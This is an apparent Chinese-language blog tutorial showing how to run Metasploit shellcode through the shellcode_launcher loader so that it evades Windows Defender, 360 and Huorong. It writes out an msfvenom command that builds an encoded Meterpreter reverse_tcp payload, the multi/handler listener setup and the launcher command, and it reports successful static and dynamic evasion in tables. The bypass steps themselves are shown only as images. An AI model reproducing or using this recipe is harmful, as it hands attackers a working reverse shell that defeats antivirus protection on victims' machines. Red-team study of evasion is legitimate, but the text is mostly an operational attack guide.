# 老树开新花之shellcode_launcher免杀Windows Defender


# 1. 说明
本文的所有技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他，请在24小时内删除工具文件！！！
​

工具估计已经失效！！！仅供参考！

工具详细信息：https://mp.weixin.qq.com/s/MHZT_Z2dA4FvzAytfdyuGQ

# 2. 免杀效果

2.1 **静态免杀**

| 杀软\免杀效果 | 虚拟机环境：Windows 10 | 虚拟机环境：Windows 7 | 虚拟机环境：Windows server 2019 | 最新测试时间 |
| --- | --- | --- | --- | --- |
| 联网Windows Defender最新版
（关闭自动发送可疑样本） | ✅ | 未测 | ✅ | 2022.01.16 |
| 联网360最新版 | ✅ | ✅ | 未测 | 2022.01.16 |
| 联网火绒最新版 | 未测 | ✅ | ✅ | 2022.01.16 |



2.2 **动态免杀效果（指的是可执行命令）**



| 杀软\免杀效果 | 虚拟机环境：Windows 10 | 虚拟机环境：Windows 7 | 虚拟机环境：Windows server 2019 | 最新测试时间 |
| --- | --- | --- | --- | --- |
| 联网Windows Defender最新版
（关闭自动发送可疑样本） | ✅ | 未测 | ✅ | 2022.01.16 |
| 联网360最新版 | ✅ | ✅ | 未测 | 2022.01.16 |
| 联网火绒最新版 | 未测 | ✅ | ✅ | 2022.01.16 |



# 3. 使用方法

## 3.1 生成shellcode


首先用`Msfvenom`生成`raw`格式的`shellcode`，当前使用了`shikata_ga_na`编码模块：
生成的监听机器为`mac`，ip为`10.211.55.2`，端口：`1234`
```python
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=10.211.55.2 lport=1234  -f raw -o shellcode.raw
```


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624029949030-29b5ec73-29f9-4dd5-bbb5-9df94dfc7d5c.png)


![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642254398164-01112f0c-11e8-4120-b0ec-a2688a793f5f.png)



`攻击机`上开启`msf`进行监听：


![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642254739820-a3e5c5f4-96fb-4a1e-bf05-ca5490f232f1.png)


```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.211.55.2
LHOST => 10.211.55.2
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.211.55.2:1234
```


然后执行`shellcode_launcher`加载器：
​

`shellcode_launcher.exe -i shellcode.raw`




![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642254817035-52bf769c-f47c-4e17-aa8c-f2a3d5522c2b.png)


此时`mac`收到会话，并且可以正常执行命令：


![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642254854246-23fcff1e-1e3f-479e-9ffe-6c336e9ec58c.png)




## 3.2 **Bypass 火绒**
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642267625868-5d78bf6e-2fc1-4b85-a3e5-608d53f34975.png)


## 3.4 Bypass Win Defender & 360


![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642267849841-c2806bda-7b40-4cef-8e0a-dc3bee308355.png)




# 4. 总结
## 4.1 免杀情况

直接整理为图片吧：
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642276998283-fefa0675-7c6c-4d40-9002-0a55f09f6d29.png)






## 4.2 缺点


在本文中，基本没有对作者的源代码进行分析，这里主要是因为篇幅太长，不适合进一步分析，其实可以在作者的基础上延伸一些更加好的方法，本文免杀中存在待优化的问题：

1. 使用`msfvenom`生成的`shellcode`会被一部分杀软标记，这些东西其实深入探究源码之后，去除特征并不算难解决。
1. 在这里看到静态免杀还是比较容易的，但是如果是执行命令等动态操作，基本上都会被优秀的杀软识别，所以在免杀上过动态检测才是研究免杀的关键。



本文在写文章的时候，可能还存在一定的问题，希望各位师傅能够批评指正，不胜感激！
​



